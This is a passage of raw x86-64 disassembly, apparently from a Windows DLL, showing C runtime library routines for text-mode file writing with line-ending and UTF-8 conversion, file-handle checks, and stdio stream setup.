   1800041b9:	45 8b c4             	mov    %r12d,%r8d
   1800041bc:	ff 15 46 4e 00 00    	call   *0x4e46(%rip)        # 0x180009008
   1800041c2:	85 c0                	test   %eax,%eax
   1800041c4:	0f 84 22 01 00 00    	je     0x1800042ec
   1800041ca:	8b fb                	mov    %ebx,%edi
   1800041cc:	41 2b fd             	sub    %r13d,%edi
   1800041cf:	03 7c 24 44          	add    0x44(%rsp),%edi
   1800041d3:	44 39 64 24 58       	cmp    %r12d,0x58(%rsp)
   1800041d8:	0f 8c 05 01 00 00    	jl     0x1800042e3
   1800041de:	83 7c 24 4c 00       	cmpl   $0x0,0x4c(%rsp)
   1800041e3:	4c 8b 64 24 50       	mov    0x50(%rsp),%r12
   1800041e8:	0f 84 c5 00 00 00    	je     0x1800042b3
   1800041ee:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1800041f4:	48 8d 05 25 b2 00 00 	lea    0xb225(%rip),%rax        # 0x18000f420
   1800041fb:	c6 44 24 60 0d       	movb   $0xd,0x60(%rsp)
   180004200:	4a 8b 0c e0          	mov    (%rax,%r12,8),%rcx
   180004204:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   180004209:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   18000420e:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
   180004212:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180004218:	ff 15 ea 4d 00 00    	call   *0x4dea(%rip)        # 0x180009008
   18000421e:	85 c0                	test   %eax,%eax
   180004220:	0f 84 c6 00 00 00    	je     0x1800042ec
   180004226:	83 7c 24 58 01       	cmpl   $0x1,0x58(%rsp)
   18000422b:	0f 8c b2 00 00 00    	jl     0x1800042e3
   180004231:	ff 44 24 44          	incl   0x44(%rsp)
   180004235:	ff c7                	inc    %edi
   180004237:	eb 7a                	jmp    0x1800042b3
   180004239:	40 80 fe 01          	cmp    $0x1,%sil
   18000423d:	74 06                	je     0x180004245
   18000423f:	40 80 fe 02          	cmp    $0x2,%sil
   180004243:	75 1e                	jne    0x180004263
   180004245:	0f b7 03             	movzwl (%rbx),%eax
   180004248:	45 33 e4             	xor    %r12d,%r12d
   18000424b:	66 83 f8 0a          	cmp    $0xa,%ax
   18000424f:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   180004254:	41 0f 94 c4          	sete   %r12b
   180004258:	48 83 c3 02          	add    $0x2,%rbx
   18000425c:	44 89 64 24 4c       	mov    %r12d,0x4c(%rsp)
   180004261:	eb 05                	jmp    0x180004268
   180004263:	44 8b 64 24 4c       	mov    0x4c(%rsp),%r12d
   180004268:	40 80 fe 01          	cmp    $0x1,%sil
   18000426c:	74 06                	je     0x180004274
   18000426e:	40 80 fe 02          	cmp    $0x2,%sil
   180004272:	75 3a                	jne    0x1800042ae
   180004274:	0f b7 4c 24 40       	movzwl 0x40(%rsp),%ecx
   180004279:	e8 de 27 00 00       	call   0x180006a5c
   18000427e:	66 3b 44 24 40       	cmp    0x40(%rsp),%ax
   180004283:	75 67                	jne    0x1800042ec
   180004285:	83 c7 02             	add    $0x2,%edi
   180004288:	45 85 e4             	test   %r12d,%r12d
   18000428b:	74 21                	je     0x1800042ae
   18000428d:	41 bc 0d 00 00 00    	mov    $0xd,%r12d
   180004293:	41 8b cc             	mov    %r12d,%ecx
   180004296:	66 44 89 64 24 40    	mov    %r12w,0x40(%rsp)
   18000429c:	e8 bb 27 00 00       	call   0x180006a5c
   1800042a1:	66 3b 44 24 40       	cmp    0x40(%rsp),%ax
   1800042a6:	75 44                	jne    0x1800042ec
   1800042a8:	ff c7                	inc    %edi
   1800042aa:	ff 44 24 44          	incl   0x44(%rsp)
   1800042ae:	4c 8b 64 24 50       	mov    0x50(%rsp),%r12
   1800042b3:	8b c3                	mov    %ebx,%eax
   1800042b5:	41 2b c5             	sub    %r13d,%eax
   1800042b8:	41 3b c6             	cmp    %r14d,%eax
   1800042bb:	73 26                	jae    0x1800042e3
   1800042bd:	e9 ea fd ff ff       	jmp    0x1800040ac
   1800042c2:	8a 03                	mov    (%rbx),%al
   1800042c4:	48 8d 15 55 b1 00 00 	lea    0xb155(%rip),%rdx        # 0x18000f420
   1800042cb:	ff c7                	inc    %edi
   1800042cd:	4a 8b 0c e2          	mov    (%rdx,%r12,8),%rcx
   1800042d1:	41 88 44 0f 4c       	mov    %al,0x4c(%r15,%rcx,1)
   1800042d6:	4a 8b 04 e2          	mov    (%rdx,%r12,8),%rax
   1800042da:	41 c7 44 07 50 01 00 	movl   $0x1,0x50(%r15,%rax,1)
   1800042e1:	00 00 
   1800042e3:	8b 5c 24 4c          	mov    0x4c(%rsp),%ebx
   1800042e7:	e9 f9 02 00 00       	jmp    0x1800045e5
   1800042ec:	ff 15 d6 4d 00 00    	call   *0x4dd6(%rip)        # 0x1800090c8
   1800042f2:	8b d8                	mov    %eax,%ebx
   1800042f4:	e9 ec 02 00 00       	jmp    0x1800045e5
   1800042f9:	8b 5c 24 4c          	mov    0x4c(%rsp),%ebx
   1800042fd:	e9 eb 02 00 00       	jmp    0x1800045ed
   180004302:	48 8d 05 17 b1 00 00 	lea    0xb117(%rip),%rax        # 0x18000f420
   180004309:	4a 8b 0c e0          	mov    (%rax,%r12,8),%rcx
   18000430d:	41 f6 44 0f 08 80    	testb  $0x80,0x8(%r15,%rcx,1)
   180004313:	0f 84 fe 02 00 00    	je     0x180004617
   180004319:	33 db                	xor    %ebx,%ebx
   18000431b:	4d 8b e5             	mov    %r13,%r12
   18000431e:	40 84 f6             	test   %sil,%sil
   180004321:	0f 85 cb 00 00 00    	jne    0x1800043f2
   180004327:	45 85 f6             	test   %r14d,%r14d
   18000432a:	0f 84 1d 03 00 00    	je     0x18000464d
   180004330:	8d 53 0d             	lea    0xd(%rbx),%edx
   180004333:	44 8b 7c 24 44       	mov    0x44(%rsp),%r15d
   180004338:	48 8d b5 20 06 00 00 	lea    0x620(%rbp),%rsi
   18000433f:	33 c9                	xor    %ecx,%ecx
   180004341:	41 8b c4             	mov    %r12d,%eax
   180004344:	41 2b c5             	sub    %r13d,%eax
   180004347:	41 3b c6             	cmp    %r14d,%eax
   18000434a:	73 27                	jae    0x180004373
   18000434c:	41 8a 04 24          	mov    (%r12),%al
   180004350:	49 ff c4             	inc    %r12
   180004353:	3c 0a                	cmp    $0xa,%al
   180004355:	75 0b                	jne    0x180004362
   180004357:	88 16                	mov    %dl,(%rsi)
   180004359:	41 ff c7             	inc    %r15d
   18000435c:	48 ff c6             	inc    %rsi
   18000435f:	48 ff c1             	inc    %rcx
   180004362:	48 ff c1             	inc    %rcx
   180004365:	88 06                	mov    %al,(%rsi)
   180004367:	48 ff c6             	inc    %rsi
   18000436a:	48 81 f9 ff 13 00 00 	cmp    $0x13ff,%rcx
   180004371:	72 ce                	jb     0x180004341
   180004373:	48 21 5c 24 20       	and    %rbx,0x20(%rsp)
   180004378:	48 8d 85 20 06 00 00 	lea    0x620(%rbp),%rax
   18000437f:	44 8b c6             	mov    %esi,%r8d
   180004382:	44 2b c0             	sub    %eax,%r8d
   180004385:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   18000438a:	48 8d 0d 8f b0 00 00 	lea    0xb08f(%rip),%rcx        # 0x18000f420
   180004391:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   180004395:	44 89 7c 24 44       	mov    %r15d,0x44(%rsp)
   18000439a:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   18000439f:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
   1800043a3:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   1800043a8:	48 8d 95 20 06 00 00 	lea    0x620(%rbp),%rdx
   1800043af:	ff 15 53 4c 00 00    	call   *0x4c53(%rip)        # 0x180009008
   1800043b5:	85 c0                	test   %eax,%eax
   1800043b7:	0f 84 2f ff ff ff    	je     0x1800042ec
   1800043bd:	03 7c 24 48          	add    0x48(%rsp),%edi
   1800043c1:	48 8d 85 20 06 00 00 	lea    0x620(%rbp),%rax
   1800043c8:	48 2b f0             	sub    %rax,%rsi
   1800043cb:	48 63 44 24 48       	movslq 0x48(%rsp),%rax
   1800043d0:	48 3b c6             	cmp    %rsi,%rax
   1800043d3:	0f 8c 0c 02 00 00    	jl     0x1800045e5
   1800043d9:	41 8b c4             	mov    %r12d,%eax
   1800043dc:	ba 0d 00 00 00       	mov    $0xd,%edx
   1800043e1:	41 2b c5             	sub    %r13d,%eax
   1800043e4:	41 3b c6             	cmp    %r14d,%eax
   1800043e7:	0f 82 46 ff ff ff    	jb     0x180004333
   1800043ed:	e9 f3 01 00 00       	jmp    0x1800045e5
   1800043f2:	40 80 fe 02          	cmp    $0x2,%sil
   1800043f6:	0f 85 d8 00 00 00    	jne    0x1800044d4
   1800043fc:	45 85 f6             	test   %r14d,%r14d
   1800043ff:	0f 84 48 02 00 00    	je     0x18000464d
   180004405:	ba 0d 00 00 00       	mov    $0xd,%edx
   18000440a:	44 8b 7c 24 44       	mov    0x44(%rsp),%r15d
   18000440f:	48 8d b5 20 06 00 00 	lea    0x620(%rbp),%rsi
   180004416:	33 c9                	xor    %ecx,%ecx
   180004418:	41 8b c4             	mov    %r12d,%eax
   18000441b:	41 2b c5             	sub    %r13d,%eax
   18000441e:	41 3b c6             	cmp    %r14d,%eax
   180004421:	73 32                	jae    0x180004455
   180004423:	41 0f b7 04 24       	movzwl (%r12),%eax
   180004428:	49 83 c4 02          	add    $0x2,%r12
   18000442c:	66 83 f8 0a          	cmp    $0xa,%ax
   180004430:	75 0f                	jne    0x180004441
   180004432:	66 89 16             	mov    %dx,(%rsi)
   180004435:	41 83 c7 02          	add    $0x2,%r15d
   180004439:	48 83 c6 02          	add    $0x2,%rsi
   18000443d:	48 83 c1 02          	add    $0x2,%rcx
   180004441:	48 83 c1 02          	add    $0x2,%rcx
   180004445:	66 89 06             	mov    %ax,(%rsi)
   180004448:	48 83 c6 02          	add    $0x2,%rsi
   18000444c:	48 81 f9 fe 13 00 00 	cmp    $0x13fe,%rcx
   180004453:	72 c3                	jb     0x180004418
   180004455:	48 21 5c 24 20       	and    %rbx,0x20(%rsp)
   18000445a:	48 8d 85 20 06 00 00 	lea    0x620(%rbp),%rax
   180004461:	44 8b c6             	mov    %esi,%r8d
   180004464:	44 2b c0             	sub    %eax,%r8d
   180004467:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   18000446c:	48 8d 0d ad af 00 00 	lea    0xafad(%rip),%rcx        # 0x18000f420
   180004473:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   180004477:	44 89 7c 24 44       	mov    %r15d,0x44(%rsp)
   18000447c:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   180004481:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
   180004485:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   18000448a:	48 8d 95 20 06 00 00 	lea    0x620(%rbp),%rdx
   180004491:	ff 15 71 4b 00 00    	call   *0x4b71(%rip)        # 0x180009008
   180004497:	85 c0                	test   %eax,%eax
   180004499:	0f 84 4d fe ff ff    	je     0x1800042ec
   18000449f:	03 7c 24 48          	add    0x48(%rsp),%edi
   1800044a3:	48 8d 85 20 06 00 00 	lea    0x620(%rbp),%rax
   1800044aa:	48 2b f0             	sub    %rax,%rsi
   1800044ad:	48 63 44 24 48       	movslq 0x48(%rsp),%rax
   1800044b2:	48 3b c6             	cmp    %rsi,%rax
   1800044b5:	0f 8c 2a 01 00 00    	jl     0x1800045e5
   1800044bb:	41 8b c4             	mov    %r12d,%eax
   1800044be:	ba 0d 00 00 00       	mov    $0xd,%edx
   1800044c3:	41 2b c5             	sub    %r13d,%eax
   1800044c6:	41 3b c6             	cmp    %r14d,%eax
   1800044c9:	0f 82 3b ff ff ff    	jb     0x18000440a
   1800044cf:	e9 11 01 00 00       	jmp    0x1800045e5
   1800044d4:	45 85 f6             	test   %r14d,%r14d
   1800044d7:	0f 84 70 01 00 00    	je     0x18000464d
   1800044dd:	41 b8 0d 00 00 00    	mov    $0xd,%r8d
   1800044e3:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800044e8:	33 d2                	xor    %edx,%edx
   1800044ea:	41 8b c4             	mov    %r12d,%eax
   1800044ed:	41 2b c5             	sub    %r13d,%eax
   1800044f0:	41 3b c6             	cmp    %r14d,%eax
   1800044f3:	73 2f                	jae    0x180004524
   1800044f5:	41 0f b7 04 24       	movzwl (%r12),%eax
   1800044fa:	49 83 c4 02          	add    $0x2,%r12
   1800044fe:	66 83 f8 0a          	cmp    $0xa,%ax
   180004502:	75 0c                	jne    0x180004510
   180004504:	66 44 89 01          	mov    %r8w,(%rcx)
   180004508:	48 83 c1 02          	add    $0x2,%rcx
   18000450c:	48 83 c2 02          	add    $0x2,%rdx
   180004510:	48 83 c2 02          	add    $0x2,%rdx
   180004514:	66 89 01             	mov    %ax,(%rcx)
   180004517:	48 83 c1 02          	add    $0x2,%rcx
   18000451b:	48 81 fa a8 06 00 00 	cmp    $0x6a8,%rdx
   180004522:	72 c6                	jb     0x1800044ea
   180004524:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   18000452a:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   180004530:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   180004535:	2b c8                	sub    %eax,%ecx
   180004537:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   18000453c:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   180004543:	00 
   180004544:	8b c1                	mov    %ecx,%eax
   180004546:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   18000454b:	99                   	cltd
   18000454c:	2b c2                	sub    %edx,%eax
   18000454e:	33 d2                	xor    %edx,%edx
   180004550:	d1 f8                	sar    $1,%eax
   180004552:	44 8b c8             	mov    %eax,%r9d
   180004555:	48 8d 85 20 06 00 00 	lea    0x620(%rbp),%rax
   18000455c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180004561:	ff 15 d9 4b 00 00    	call   *0x4bd9(%rip)        # 0x180009140
   180004567:	44 8b f8             	mov    %eax,%r15d
   18000456a:	85 c0                	test   %eax,%eax
   18000456c:	0f 84 9b 00 00 00    	je     0x18000460d
   180004572:	33 f6                	xor    %esi,%esi
   180004574:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180004579:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000457f:	48 63 ce             	movslq %esi,%rcx
   180004582:	48 8d 94 0d 20 06 00 	lea    0x620(%rbp,%rcx,1),%rdx
   180004589:	00 
   18000458a:	45 8b c7             	mov    %r15d,%r8d
   18000458d:	48 8d 0d 8c ae 00 00 	lea    0xae8c(%rip),%rcx        # 0x18000f420
   180004594:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   180004598:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   18000459d:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   1800045a2:	48 8b 0c 08          	mov    (%rax,%rcx,1),%rcx
   1800045a6:	44 2b c6             	sub    %esi,%r8d
   1800045a9:	ff 15 59 4a 00 00    	call   *0x4a59(%rip)        # 0x180009008
   1800045af:	85 c0                	test   %eax,%eax
   1800045b1:	74 0b                	je     0x1800045be
   1800045b3:	03 74 24 48          	add    0x48(%rsp),%esi
   1800045b7:	44 3b fe             	cmp    %esi,%r15d
   1800045ba:	7f b8                	jg     0x180004574
   1800045bc:	eb 08                	jmp    0x1800045c6
   1800045be:	ff 15 04 4b 00 00    	call   *0x4b04(%rip)        # 0x1800090c8
   1800045c4:	8b d8                	mov    %eax,%ebx
   1800045c6:	44 3b fe             	cmp    %esi,%r15d
   1800045c9:	7f 15                	jg     0x1800045e0
   1800045cb:	41 8b fc             	mov    %r12d,%edi
   1800045ce:	41 b8 0d 00 00 00    	mov    $0xd,%r8d
   1800045d4:	41 2b fd             	sub    %r13d,%edi
   1800045d7:	41 3b fe             	cmp    %r14d,%edi
   1800045da:	0f 82 03 ff ff ff    	jb     0x1800044e3
   1800045e0:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   1800045e5:	85 ff                	test   %edi,%edi
   1800045e7:	0f 85 9b 00 00 00    	jne    0x180004688
   1800045ed:	85 db                	test   %ebx,%ebx
   1800045ef:	74 5c                	je     0x18000464d
   1800045f1:	83 fb 05             	cmp    $0x5,%ebx
   1800045f4:	75 4b                	jne    0x180004641
   1800045f6:	e8 a5 e0 ff ff       	call   0x1800026a0
   1800045fb:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   180004601:	e8 ba e0 ff ff       	call   0x1800026c0
   180004606:	89 18                	mov    %ebx,(%rax)
   180004608:	e9 b8 f9 ff ff       	jmp    0x180003fc5
   18000460d:	ff 15 b5 4a 00 00    	call   *0x4ab5(%rip)        # 0x1800090c8
   180004613:	8b d8                	mov    %eax,%ebx
   180004615:	eb c9                	jmp    0x1800045e0
   180004617:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
   18000461b:	48 21 7c 24 20       	and    %rdi,0x20(%rsp)
   180004620:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   180004625:	45 8b c6             	mov    %r14d,%r8d
   180004628:	49 8b d5             	mov    %r13,%rdx
   18000462b:	ff 15 d7 49 00 00    	call   *0x49d7(%rip)        # 0x180009008
   180004631:	85 c0                	test   %eax,%eax
   180004633:	0f 84 b3 fc ff ff    	je     0x1800042ec
   180004639:	8b 7c 24 48          	mov    0x48(%rsp),%edi
   18000463d:	33 db                	xor    %ebx,%ebx
   18000463f:	eb a4                	jmp    0x1800045e5
   180004641:	8b cb                	mov    %ebx,%ecx
   180004643:	e8 98 e0 ff ff       	call   0x1800026e0
   180004648:	e9 78 f9 ff ff       	jmp    0x180003fc5
   18000464d:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180004652:	48 8d 0d c7 ad 00 00 	lea    0xadc7(%rip),%rcx        # 0x18000f420
   180004659:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   18000465d:	41 f6 44 07 08 40    	testb  $0x40,0x8(%r15,%rax,1)
   180004663:	74 0b                	je     0x180004670
   180004665:	41 80 7d 00 1a       	cmpb   $0x1a,0x0(%r13)
   18000466a:	0f 84 32 f9 ff ff    	je     0x180003fa2
   180004670:	e8 2b e0 ff ff       	call   0x1800026a0
   180004675:	c7 00 1c 00 00 00    	movl   $0x1c,(%rax)
   18000467b:	e8 40 e0 ff ff       	call   0x1800026c0
   180004680:	83 20 00             	andl   $0x0,(%rax)
   180004683:	e9 3d f9 ff ff       	jmp    0x180003fc5
   180004688:	2b 7c 24 44          	sub    0x44(%rsp),%edi
   18000468c:	8b c7                	mov    %edi,%eax
   18000468e:	48 8b 8d 20 1a 00 00 	mov    0x1a20(%rbp),%rcx
   180004695:	48 33 cc             	xor    %rsp,%rcx
   180004698:	e8 c3 13 00 00       	call   0x180005a60
   18000469d:	48 8b 9c 24 88 1b 00 	mov    0x1b88(%rsp),%rbx
   1800046a4:	00 
   1800046a5:	48 81 c4 30 1b 00 00 	add    $0x1b30,%rsp
   1800046ac:	41 5f                	pop    %r15
   1800046ae:	41 5e                	pop    %r14
   1800046b0:	41 5d                	pop    %r13
   1800046b2:	41 5c                	pop    %r12
   1800046b4:	5f                   	pop    %rdi
   1800046b5:	5e                   	pop    %rsi
   1800046b6:	5d                   	pop    %rbp
   1800046b7:	c3                   	ret
   1800046b8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800046bd:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1800046c1:	56                   	push   %rsi
   1800046c2:	57                   	push   %rdi
   1800046c3:	41 54                	push   %r12
   1800046c5:	41 55                	push   %r13
   1800046c7:	41 56                	push   %r14
   1800046c9:	48 83 ec 20          	sub    $0x20,%rsp
   1800046cd:	41 8b f0             	mov    %r8d,%esi
   1800046d0:	4c 8b e2             	mov    %rdx,%r12
   1800046d3:	48 63 f9             	movslq %ecx,%rdi
   1800046d6:	83 ff fe             	cmp    $0xfffffffe,%edi
   1800046d9:	75 18                	jne    0x1800046f3
   1800046db:	e8 e0 df ff ff       	call   0x1800026c0
   1800046e0:	83 20 00             	andl   $0x0,(%rax)
   1800046e3:	e8 b8 df ff ff       	call   0x1800026a0
   1800046e8:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1800046ee:	e9 8f 00 00 00       	jmp    0x180004782
   1800046f3:	85 c9                	test   %ecx,%ecx
   1800046f5:	78 73                	js     0x18000476a
   1800046f7:	3b 3d 07 ad 00 00    	cmp    0xad07(%rip),%edi        # 0x18000f404
   1800046fd:	73 6b                	jae    0x18000476a
   1800046ff:	48 8b df             	mov    %rdi,%rbx
   180004702:	4c 8b ef             	mov    %rdi,%r13
   180004705:	49 c1 fd 05          	sar    $0x5,%r13
   180004709:	4c 8d 35 10 ad 00 00 	lea    0xad10(%rip),%r14        # 0x18000f420
   180004710:	83 e3 1f             	and    $0x1f,%ebx
   180004713:	48 6b db 58          	imul   $0x58,%rbx,%rbx
   180004717:	4b 8b 04 ee          	mov    (%r14,%r13,8),%rax
   18000471b:	0f be 4c 18 08       	movsbl 0x8(%rax,%rbx,1),%ecx
   180004720:	83 e1 01             	and    $0x1,%ecx
   180004723:	74 45                	je     0x18000476a
   180004725:	8b cf                	mov    %edi,%ecx
   180004727:	e8 60 22 00 00       	call   0x18000698c
   18000472c:	90                   	nop
   18000472d:	4b 8b 04 ee          	mov    (%r14,%r13,8),%rax
   180004731:	f6 44 18 08 01       	testb  $0x1,0x8(%rax,%rbx,1)
   180004736:	74 11                	je     0x180004749
   180004738:	44 8b c6             	mov    %esi,%r8d
   18000473b:	49 8b d4             	mov    %r12,%rdx
   18000473e:	8b cf                	mov    %edi,%ecx
   180004740:	e8 13 f8 ff ff       	call   0x180003f58
   180004745:	8b d8                	mov    %eax,%ebx
   180004747:	eb 16                	jmp    0x18000475f
   180004749:	e8 52 df ff ff       	call   0x1800026a0
   18000474e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   180004754:	e8 67 df ff ff       	call   0x1800026c0
   180004759:	83 20 00             	andl   $0x0,(%rax)
   18000475c:	83 cb ff             	or     $0xffffffff,%ebx
   18000475f:	8b cf                	mov    %edi,%ecx
   180004761:	e8 ce 22 00 00       	call   0x180006a34
   180004766:	8b c3                	mov    %ebx,%eax
   180004768:	eb 1b                	jmp    0x180004785
   18000476a:	e8 51 df ff ff       	call   0x1800026c0
   18000476f:	83 20 00             	andl   $0x0,(%rax)
   180004772:	e8 29 df ff ff       	call   0x1800026a0
   180004777:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000477d:	e8 b6 de ff ff       	call   0x180002638
   180004782:	83 c8 ff             	or     $0xffffffff,%eax
   180004785:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   18000478a:	48 83 c4 20          	add    $0x20,%rsp
   18000478e:	41 5e                	pop    %r14
   180004790:	41 5d                	pop    %r13
   180004792:	41 5c                	pop    %r12
   180004794:	5f                   	pop    %rdi
   180004795:	5e                   	pop    %rsi
   180004796:	c3                   	ret
   180004797:	cc                   	int3
   180004798:	40 53                	rex push %rbx
   18000479a:	48 83 ec 20          	sub    $0x20,%rsp
   18000479e:	ff 05 ac 8d 00 00    	incl   0x8dac(%rip)        # 0x18000d550
   1800047a4:	48 8b d9             	mov    %rcx,%rbx
   1800047a7:	b9 00 10 00 00       	mov    $0x1000,%ecx
   1800047ac:	e8 47 e5 ff ff       	call   0x180002cf8
   1800047b1:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1800047b5:	48 85 c0             	test   %rax,%rax
   1800047b8:	74 0d                	je     0x1800047c7
   1800047ba:	83 4b 18 08          	orl    $0x8,0x18(%rbx)
   1800047be:	c7 43 24 00 10 00 00 	movl   $0x1000,0x24(%rbx)
   1800047c5:	eb 13                	jmp    0x1800047da
   1800047c7:	83 4b 18 04          	orl    $0x4,0x18(%rbx)
   1800047cb:	48 8d 43 20          	lea    0x20(%rbx),%rax
   1800047cf:	c7 43 24 02 00 00 00 	movl   $0x2,0x24(%rbx)
   1800047d6:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1800047da:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1800047de:	83 63 08 00          	andl   $0x0,0x8(%rbx)
   1800047e2:	48 89 03             	mov    %rax,(%rbx)
   1800047e5:	48 83 c4 20          	add    $0x20,%rsp
   1800047e9:	5b                   	pop    %rbx
   1800047ea:	c3                   	ret
   1800047eb:	cc                   	int3
   1800047ec:	48 83 ec 28          	sub    $0x28,%rsp
   1800047f0:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   1800047f3:	75 0d                	jne    0x180004802
   1800047f5:	e8 a6 de ff ff       	call   0x1800026a0
   1800047fa:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   180004800:	eb 42                	jmp    0x180004844
   180004802:	85 c9                	test   %ecx,%ecx
   180004804:	78 2e                	js     0x180004834
   180004806:	3b 0d f8 ab 00 00    	cmp    0xabf8(%rip),%ecx        # 0x18000f404
   18000480c:	73 26                	jae    0x180004834
   18000480e:	48 63 c9             	movslq %ecx,%rcx
   180004811:	48 8d 15 08 ac 00 00 	lea    0xac08(%rip),%rdx        # 0x18000f420
   180004818:	48 8b c1             	mov    %rcx,%rax
   18000481b:	83 e1 1f             	and    $0x1f,%ecx
   18000481e:	48 c1 f8 05          	sar    $0x5,%rax
   180004822:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   180004826:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   18000482a:	0f be 44 08 08       	movsbl 0x8(%rax,%rcx,1),%eax
   18000482f:	83 e0 40             	and    $0x40,%eax
   180004832:	eb 12                	jmp    0x180004846
   180004834:	e8 67 de ff ff       	call   0x1800026a0
   180004839:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000483f:	e8 f4 dd ff ff       	call   0x180002638
   180004844:	33 c0                	xor    %eax,%eax
   180004846:	48 83 c4 28          	add    $0x28,%rsp
   18000484a:	c3                   	ret
   18000484b:	cc                   	int3
   18000484c:	48 8d 05 9d 79 00 00 	lea    0x799d(%rip),%rax        # 0x18000c1f0
   180004853:	c3                   	ret
   180004854:	40 53                	rex push %rbx
   180004856:	48 83 ec 20          	sub    $0x20,%rsp
   18000485a:	8b 05 a0 ab 00 00    	mov    0xaba0(%rip),%eax        # 0x18000f400
   180004860:	bb 14 00 00 00       	mov    $0x14,%ebx
   180004865:	85 c0                	test   %eax,%eax
   180004867:	75 07                	jne    0x180004870
   180004869:	b8 00 02 00 00       	mov    $0x200,%eax
   18000486e:	eb 05                	jmp    0x180004875
   180004870:	3b c3                	cmp    %ebx,%eax
   180004872:	0f 4c c3             	cmovl  %ebx,%eax
   180004875:	48 63 c8             	movslq %eax,%rcx
   180004878:	ba 08 00 00 00       	mov    $0x8,%edx
   18000487d:	89 05 7d ab 00 00    	mov    %eax,0xab7d(%rip)        # 0x18000f400
   180004883:	e8 f0 e4 ff ff       	call   0x180002d78
   180004888:	48 89 05 59 9b 00 00 	mov    %rax,0x9b59(%rip)        # 0x18000e3e8
   18000488f:	48 85 c0             	test   %rax,%rax
   180004892:	75 24                	jne    0x1800048b8
   180004894:	8d 50 08             	lea    0x8(%rax),%edx
   180004897:	48 8b cb             	mov    %rbx,%rcx
   18000489a:	89 1d 60 ab 00 00    	mov    %ebx,0xab60(%rip)        # 0x18000f400
   1800048a0:	e8 d3 e4 ff ff       	call   0x180002d78
   1800048a5:	48 89 05 3c 9b 00 00 	mov    %rax,0x9b3c(%rip)        # 0x18000e3e8
   1800048ac:	48 85 c0             	test   %rax,%rax
   1800048af:	75 07                	jne    0x1800048b8
   1800048b1:	b8 1a 00 00 00       	mov    $0x1a,%eax
   1800048b6:	eb 76                	jmp    0x18000492e
   1800048b8:	33 c9                	xor    %ecx,%ecx
   1800048ba:	48 8d 15 2f 79 00 00 	lea    0x792f(%rip),%rdx        # 0x18000c1f0
   1800048c1:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   1800048c5:	48 83 c2 30          	add    $0x30,%rdx
   1800048c9:	48 83 c1 08          	add    $0x8,%rcx
   1800048cd:	48 ff cb             	dec    %rbx
   1800048d0:	74 09                	je     0x1800048db
   1800048d2:	48 8b 05 0f 9b 00 00 	mov    0x9b0f(%rip),%rax        # 0x18000e3e8
   1800048d9:	eb e6                	jmp    0x1800048c1
   1800048db:	45 33 c0             	xor    %r8d,%r8d
   1800048de:	48 8d 15 27 79 00 00 	lea    0x7927(%rip),%rdx        # 0x18000c20c
   1800048e5:	45 8d 48 03          	lea    0x3(%r8),%r9d
   1800048e9:	49 8b c8             	mov    %r8,%rcx
   1800048ec:	4c 8d 15 2d ab 00 00 	lea    0xab2d(%rip),%r10        # 0x18000f420
   1800048f3:	49 8b c0             	mov    %r8,%rax
   1800048f6:	48 c1 f8 05          	sar    $0x5,%rax
   1800048fa:	83 e1 1f             	and    $0x1f,%ecx
   1800048fd:	49 8b 04 c2          	mov    (%r10,%rax,8),%rax
   180004901:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   180004905:	4c 8b 14 01          	mov    (%rcx,%rax,1),%r10
   180004909:	49 83 fa ff          	cmp    $0xffffffffffffffff,%r10
   18000490d:	74 0b                	je     0x18000491a
   18000490f:	49 83 fa fe          	cmp    $0xfffffffffffffffe,%r10
   180004913:	74 05                	je     0x18000491a
   180004915:	4d 85 d2             	test   %r10,%r10
   180004918:	75 06                	jne    0x180004920
   18000491a:	c7 02 fe ff ff ff    	movl   $0xfffffffe,(%rdx)
   180004920:	49 ff c0             	inc    %r8
